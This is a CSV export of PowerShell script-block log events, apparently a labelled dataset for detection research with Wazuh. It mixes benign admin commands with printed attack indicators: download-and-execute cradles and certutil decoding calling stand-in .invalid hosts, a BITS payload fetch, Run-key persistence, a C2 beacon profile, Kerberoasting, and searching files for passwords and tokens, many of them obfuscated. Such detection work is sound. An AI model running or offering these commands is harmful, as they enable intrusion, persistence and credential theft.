sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-138,PST-138,mapped,138,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722616,2026-07-17T09:36:31.4200713Z,4104,efbe1115-fead-4229-85d2-a3a10231b44c,1,1,exact,31c57c73e18697f34cacc67f8221b0a2f28239c8667c7c690609ee20b6f6df77,"$sampleId='PST-138'; $indicator='certutil.exe -urlcache -split -f https://cert.example.invalid/blob.txt C:\__THESIS_INERT__\blob.txt; certutil.exe -decode C:\__THESIS_INERT__\blob.txt C:\__THESIS_INERT__\stage.bin'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-139,PST-139,mapped,139,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722629,2026-07-17T09:36:31.7417582Z,4104,0a5dd4aa-3e7c-4da0-a4d1-4fde3649a991,1,1,exact,c2819e43a4d24269a1534922c18a6d0b5924bb6d8f91569d5c7bb4a4548bc3e1,"$sampleId='PST-139'; $indicator='IEX (New-' + 'Object' + ' Net.We' + 'bClient)' + '.DownloadStri' + 'ng(''https' + '://stage.exam' + 'ple.in' + 'valid/boot' + 'strap.ps1'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-140,PST-140,mapped,140,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722631,2026-07-17T09:36:32.0703753Z,4104,bf1ba6c7-5024-4e1e-944e-c5774e43ce2a,1,1,exact,dff98cf19222283d71ba5b6a0e7b64107fbf2b683f47375cfca7b434de7b9e5b,"$sampleId='PST-140'; Get-Date | Select-Object DateTime; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-141,PST-141,mapped,141,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722636,2026-07-17T09:36:32.4330295Z,4104,a8152bb5-0540-4899-a578-5b6b6a204f73,1,1,exact,b6b5a9dd171ef7a6b98bf97fc92122e94b58cf9de2c42e7cf867c26ae5214774,"$sampleId='PST-141'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-142,PST-142,mapped,142,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722639,2026-07-17T09:36:32.7658123Z,4104,f1a79161-4979-4891-a25e-b9938d2b19e5,1,1,exact,081ead397f47569c938d71808a1cf8d5b05925c0ee5fc85538cfe0cb61d34c84,"$sampleId='PST-142'; $indicator='powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-143,PST-143,mapped,143,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722642,2026-07-17T09:36:33.0863308Z,4104,0b5ee2bd-6986-433d-9adc-0cdf907f9ea4,1,1,exact,1823f2b7447f644077851f09d9124010c666908e53446d7a5c49fb4d542d5146,"$sampleId='PST-143'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-144,PST-144,mapped,144,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722756,2026-07-17T09:36:36.8170975Z,4104,9475418f-2118-4c6c-97a2-93bad3eb1de0,1,1,exact,253639e15c20c23e1ddfb7fe986a20892c4ebf1214809b37f7953a9074545869,"$sampleId='PST-144'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-145,PST-145,mapped,145,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722760,2026-07-17T09:36:37.1968030Z,4104,672dcdfc-6ed8-4c9b-91bc-70b45b98497a,1,1,exact,dd35fa72a58aa3775b33e2ddf92ae37ddb42e7f487d4d4f5d527cd0902cbf12e,"$sampleId='PST-145'; $encoded='cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-146,PST-146,mapped,146,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722765,2026-07-17T09:36:37.5376177Z,4104,b558ef8a-0b65-4a6f-b624-fc7ce3a6720d,1,1,exact,6f4d92cfbb33e0e9ad8e89de6820ee45d341da1f2d779005a53798c62620e3b4,"$sampleId='PST-146'; $indicator='IEX (New-Object Net.WebClient).DownloadString(''https://stage.example.invalid/bootstrap.ps1'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-147,PST-147,mapped,147,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722781,2026-07-17T09:36:37.8725309Z,4104,d357bc7b-7b86-4c10-b232-dc8d9492e0d0,1,1,exact,7a376493c03f9c5969f102972715cb46be4719e142d1fcfaefde189f7d75ab7d,"$sampleId='PST-147'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-148,PST-148,mapped,148,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722795,2026-07-17T09:36:38.2123905Z,4104,4d72609f-a002-477f-be4f-5eda01cdf7f3,1,1,exact,27cc80b12d08a8c4c61acc0f75ae83d2d8fdd5dd7c5e265f150f90d37f287cb7,"$sampleId='PST-148'; Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-149,PST-149,mapped,149,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722798,2026-07-17T09:36:38.5655191Z,4104,c80f57ed-5a21-4abe-bc4c-a6cbb0169246,1,1,exact,0e2fcaa0232cec0f5799710b0676c98a89a6dfdc1f9e661514ce7fa8eb8dec29,"$sampleId='PST-149'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-150,PST-150,mapped,150,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722808,2026-07-17T09:36:39.1743375Z,4104,3d9538b8-9dd5-4595-9180-969e1859b685,1,1,exact,b8e53fc36ad060fd7551f4f33eea0e8649865c882fe2d2a3b8958f7cfc6f79c8,"$sampleId='PST-150'; $indicator='Add-Type -MemberDefinition ''[DllImport(""kernel32.dll"")] public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);'' -Name NativeMethods -Namespace Thesis.Inert'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-151,PST-151,mapped,151,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722811,2026-07-17T09:36:39.4911845Z,4104,d5ff756d-74bc-42fd-a4d8-ffab51fd269c,1,1,exact,12abb11adb3f753399e0bcd8f5e2e0c72cfb81b463f343dae9ea7be6bce9e2fe,"$sampleId='PST-151'; $parts=@('Start-Bit','sTrans','fer -Sour','ce ''https','://bits.e','xample.inv','alid/payl','oad.bin',''' -Destinati','on ''$','env:TEMP\ca','che.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-152,PST-152,mapped,152,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722825,2026-07-17T09:36:39.8252451Z,4104,434c76b2-bcee-45d1-9327-614278686e82,1,1,exact,d3ac7d5ba78a92651006f9bdd2ab30c16ba0975dc3acf36e8119857897d78700,"$sampleId='PST-152'; $indicator='Get-Chi`ldItem ''$env:USE`RPROFILE\Doc`uments'' -Recurse | Co`mpress-Archi`ve -Destin`ationP`ath ''$env:TEMP\co`llect.zip'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-153,PST-153,mapped,153,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722826,2026-07-17T09:36:40.1557491Z,4104,28b4c492-3489-41f7-a727-67a94f265339,1,1,exact,b419a2c012d3c0896f0d456263774e2e2ff1ff0241bfe807173c9d5e7d6ec612,"$sampleId='PST-153'; Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-154,PST-154,mapped,154,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722829,2026-07-17T09:36:40.4907339Z,4104,09a8ef5e-560c-4475-92ae-5c4c006a6c81,1,1,exact,8ec080909dbe896c3b9aec82e9b2f138b349d0d259dc760eddfaed78fd88f3f1,"$sampleId='PST-154'; $encoded='UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-155,PST-155,mapped,155,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722833,2026-07-17T09:36:40.8217898Z,4104,d4b92f06-89cd-41b4-a8db-74b1bfeed39c,1,1,exact,ef440e63a926fa1ca6f53ef4465924a8b9f69ce18f8dcdd30c4fc880807999a6,"$sampleId='PST-155'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-156,PST-156,mapped,156,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722837,2026-07-17T09:36:41.2433468Z,4104,3e7d8ee4-0a75-4df2-b82b-69853be83bc1,1,1,exact,069549e7e7ba3d612990879aac60f697d61c9c15f0638e190a2bdf9f6b6358f1,"$sampleId='PST-156'; $parts=@('New-ItemPropert','y -Path ''HKCU:\So','ftware\Microsof','t\Windows\C','urrentVersio','n\Run'' -Name ''Upd','ateCheck'' -Value',' ''powershell.exe ','-WindowStyle Hid','den -File C:\__T','HESIS_INERT__\s','tage.ps1'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-157,PST-157,mapped,157,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722841,2026-07-17T09:36:41.5785174Z,4104,5ee090fb-1113-4ff4-a30a-9cfd2695ccaf,1,1,exact,64ea3ea07f408f9a5685d33c1038a6f3cb40295ea15b7aaa4ef26bc344a8c8b7,"$sampleId='PST-157'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-158,PST-158,mapped,158,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722856,2026-07-17T09:36:42.2077583Z,4104,b7e68288-9e35-4dc0-ab7d-cd858de0c646,1,1,exact,bf17677c59655f1d03fe25fdc9a84539893c9073395958b31ced9f324f42ba78,"$sampleId='PST-158'; Get-Culture | Select-Object Name, DisplayName; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-159,PST-159,mapped,159,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722858,2026-07-17T09:36:42.5353703Z,4104,2dcf05fb-5ec6-4365-bb8e-329dc2c63881,1,1,exact,4b00e87368c46a87c185697ab81f4d17cf84d94a8f0e3741d715395f70a7568c,"$sampleId='PST-159'; $indicator='Resolve-DnsName -Type TXT -Name ''task.examp`le.in`valid'' | Select-Obje`ct -Expa`ndP`roperty St`rings'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-160,PST-160,mapped,160,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722863,2026-07-17T09:36:42.8587736Z,4104,f679d2f5-0a1a-4a43-976b-b939106b1c8f,1,1,exact,90c9b4fcb11f76e08b93bdcc6d637f6f11e3478b3acdc5321629d89d72e00f8a,"$sampleId='PST-160'; $indicator='$PRoFIle=@{SLeeP=60000;jItter=0.25;USERAgeNT=''MozILlA/5.0'';UrI=''/API/v1/STaTuS''}; INVOKe-webRequest -URI ''httpS://c2.ExamPle.inValiD/ApI/v1/StAtUs'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-161,PST-161,mapped,161,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722866,2026-07-17T09:36:43.1800189Z,4104,b72fa222-3b5f-4daa-9ad1-cc09be0fd7ce,1,1,exact,eeab8fe6a7c99c0e1d1c0604186a50159c444b8d887ebf7eb40cc2cafd81d4e6,"$sampleId='PST-161'; $parts=@('INv`Oke-Ker','bERO`as','t -OuTpU','tFoR`m`aT ','HaSH`cA','t | SEL','ect-obJe','`ct sA','MAcCOu`ntN','`AmE,HASH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-162,PST-162,mapped,162,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722870,2026-07-17T09:36:43.5051326Z,4104,9a7dc18b-a177-4387-a54c-0aedbb4ab302,1,1,exact,c84e17c792f1ca3a70459dd6ade8b550d0204245755784f12a6f7da7cde9f5a4,"$sampleId='PST-162'; $indicator='Get-ChildItem ''C:\Users'' -Recurse -Force -ErrorAction SilentlyContinue'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-163,PST-163,mapped,163,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722873,2026-07-17T09:36:43.8355243Z,4104,1eef9795-2d0b-4b70-b734-c9a4914a5b37,1,1,exact,f6b4b749c79db1375fb233d969a5fd7ea0007e0a5e21e54675a66a1f748c71c1,"$sampleId='PST-163'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-164,PST-164,mapped,164,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722888,2026-07-17T09:36:44.1940011Z,4104,8dbc7699-63fe-4235-881a-5df26584533f,1,1,exact,74430387aeb790817891bb48a3fb5ea43a4cc51a9cfc48a7f1a38eb57f1dbe86,"$sampleId='PST-164'; $indicator='$wc=New-Object Net' + '.WebClient; $w' + 'c.Proxy=[Net.W' + 'ebRequest]::De' + 'faultWebProxy; $wc.' + 'Headers[''User-Ag' + 'ent'']=''Mozilla/5.0''; ' + '$wc.DownloadSt' + 'ring(''https://cdn' + '.example.invalid/a' + ''')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-165,PST-165,mapped,165,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722891,2026-07-17T09:36:44.5323078Z,4104,65c3de4e-647b-49be-97a2-87bd9be37d8b,1,1,exact,60c4e6c9c4433844d8310f2fc71ce81ffc772062cdc93199ffd41637af9a9544,"$sampleId='PST-165'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-166,PST-166,mapped,166,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722956,2026-07-17T09:36:49.7400756Z,4104,3f14f0f1-1938-4a2b-b87d-b4a78cc6cf15,1,1,exact,8bc5c8a3f815cf2a443fb27a706dd523defd2aab2d4e0960e1081ef8901bb5e1,"$sampleId='PST-166'; $parts=@('Get-Ch','ildItem',' -Path ''','C:\Users'' -','Recurse -I','nclude ''','*.config''',',''*.xml''',' | Select-Str','ing -Pattern',' ''passwor','d|token|secret',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-167,PST-167,mapped,167,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722960,2026-07-17T09:36:50.0671168Z,4104,08285900-4595-42c2-bfc6-9f25eb089136,1,1,exact,81db22f638c151a66c63c6119cd91bbd569ccb1d38377fa07ac4413f7ad570d8,"$sampleId='PST-167'; $indicator='$cmd=(''Inv''+''oke-Expres`sion''); & (Get-Com`mand $cmd) ""Write-Output ''TH`ESIS-INERT''""'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-168,PST-168,mapped,168,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722963,2026-07-17T09:36:50.4029133Z,4104,88268e74-7e4a-4693-b6fc-19fa1b0e70d6,1,1,exact,a048a988c0683a1852b7d2d23fec827f8c997f4677e7eb0cffaf1246607779bb,"$sampleId='PST-168'; $json = '{""server"":""srv-file-01"",""mode"":""audit"",""enabled"":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-169,PST-169,mapped,169,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722967,2026-07-17T09:36:50.7510264Z,4104,e2052e60-02be-43d8-b80e-c539e4752220,1,1,exact,dba86e29dba35637b68c5c0b55f5585452902ad22a1ef1ca28a1dcf0713e9434,"$sampleId='PST-169'; $encoded='UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-170,PST-170,mapped,170,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722969,2026-07-17T09:36:51.0748105Z,4104,18b36588-1f30-4e09-b0cd-fcb2d5f22288,1,1,exact,f69c43d42d27eb3392ca3a707c40ffce1e8bed9a9fea14ec7c5f809a2f60db0f,"$sampleId='PST-170'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-171,PST-171,mapped,171,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722984,2026-07-17T09:36:51.5193879Z,4104,29338b00-762e-429d-99eb-50dfeb0b3950,1,1,exact,74cc7171aaa3fb200854f5f1d6f42df7adf67a4302aa610c5e380308f794a3e3,"$sampleId='PST-171'; $indicator='rundll3' + '2.e' + 'xe C:\__T' + 'HESIS_I' + 'NERT__\st' + 'age.dll' + ',EntryP' + 'oint'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-172,PST-172,mapped,172,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722988,2026-07-17T09:36:51.8516218Z,4104,b840c6c6-784b-456b-a1f5-73cb283ff964,1,1,exact,eeb4944cba58c97087d16c83699f88415174fb32ae11ec1e18bb676c4146a9c8,"$sampleId='PST-172'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-173,PST-173,mapped,173,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722991,2026-07-17T09:36:52.1765408Z,4104,0d8b5649-b1f2-474e-8170-aa06d6c4b2a0,1,1,exact,d7ba7b41f238f32135415386a09819ce0519247a359b426e1c38540c267c2afe,"$sampleId='PST-173'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-174,PST-174,mapped,174,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723006,2026-07-17T09:36:52.5745130Z,4104,3ee6269b-2da9-46e2-bf8c-03a14c87c1e7,1,1,exact,a882d61d2538e1e794db753d214b6aacb2a4e69b6dfb6ca7e303d1d2ee85856b,"$sampleId='PST-174'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-175,PST-175,mapped,175,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723008,2026-07-17T09:36:52.9143022Z,4104,b45007b9-ebea-4f74-b2ec-2334917603b9,1,1,exact,7f6dcec4f67959543c01de310676f2eb553164c55191bc0270af5a96598319e4,"$sampleId='PST-175'; $indicator='Start-BitsTransfer -Source ''https://bits.example.invalid/payload.bin'' -Destination ''$env:TEMP\cache.bin'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-176,PST-176,mapped,176,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723009,2026-07-17T09:36:53.2449450Z,4104,d5620b7f-bf48-4101-ac58-014e2b91cc48,1,1,exact,851d1b04fce471328c049b01574104bcd8ee18227eec3871c61679be050307be,"$sampleId='PST-176'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-177,PST-177,mapped,177,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723013,2026-07-17T09:36:53.5753489Z,4104,0b1ffff2-2762-4351-b021-722883d466ba,1,1,exact,ed4d7d7a6f8c9fad820ba7490ecc3ca01fbee1b08a63acb282a6bc02f33d8c7b,"$sampleId='PST-177'; $indicator='InvokE-wEbrEquEsT -uRi ''HtTPs://FILes.examPlE.invAlid/UpdATe.BiN'' -oUTFiLE ''$ENv:temp\UpdATe.BIN'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-178,PST-178,mapped,178,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723018,2026-07-17T09:36:53.9019188Z,4104,dbf493e7-2156-493a-81bf-7cc1a864b743,1,1,exact,28fc700f8bdc9d3d7acdf4af21d5666b227be8b567e2d9990c5c6d23b8e8c845,"$sampleId='PST-178'; $indicator='[Reflection.Assembly]::Load([Convert]::FromBase64String(''VEhFU0lTLUlORVJULURVTU1Z''))'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-179,PST-179,mapped,179,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723019,2026-07-17T09:36:54.2346579Z,4104,fb1e8b95-0c37-4158-84f5-c43cdf510755,1,1,exact,4b5f445cab07b41c501e33fb2189b904cea25ef47de165cb3463854ef4b94eac,"$sampleId='PST-179'; $parts=@('CErtUTiL.exe -Url`','cache -sPlIt -f Ht','tPs://CERt.EXA`mp','lE.IN`valID/bl','ob.Txt c:\_','_THesIs_iNErT_','_\BLOb.txT; CER','TutiL.exe -D','EC`ODE C:\__tHEs`IS','_iNeRT__\BlOb.tXT C',':\__tHeS`IS_inEr','t__\stage.bi','n'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-180,PST-180,mapped,180,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723022,2026-07-17T09:36:54.5598480Z,4104,1f728bc2-3f61-4a4a-8236-f61dfb156060,1,1,exact,1f85828fafce37dd79123ba6ead04c82600ec220107665173970ba85f1ee2f12,"$sampleId='PST-180'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-181,PST-181,mapped,181,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723065,2026-07-17T09:36:57.6777631Z,4104,820f33ac-eedc-4e39-a8c6-1b364fa23660,1,1,exact,df306c68ec265ca82d2c00b91236e3ef81b8153aac3340fe442fc0a8831f2927,"$sampleId='PST-181'; $indicator='Resolve-DnsName -Type TXT -Name ''task.example.invalid'' | Select-Object -ExpandProperty Strings'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-182,PST-182,mapped,182,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723069,2026-07-17T09:36:58.0136285Z,4104,7c8ebd40-0ace-44dd-8b4d-10e04c9b3665,1,1,exact,64e4b782ad262422df7ede6a9eafaba69bd6ae40ae37ad15c66a41d090b7e8b2,"$sampleId='PST-182'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-183,PST-183,mapped,183,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723074,2026-07-17T09:36:58.3594848Z,4104,c797960f-44e5-4ae1-8689-9c5a0641f1a8,1,1,exact,b9ea6500e2993875c0c9952c55e51490d1dddea97641c9d8e21f07ba98e234ec,"$sampleId='PST-183'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-184,PST-184,mapped,184,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723089,2026-07-17T09:36:58.7136550Z,4104,e13aeb76-d4eb-4578-b3af-a0a64fcbdf86,1,1,exact,b5d2a07c567f99ed1c7dabc6763b90f5d7ec8a6591c63de20032554881bb4218,"$sampleId='PST-184'; powercfg /L; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
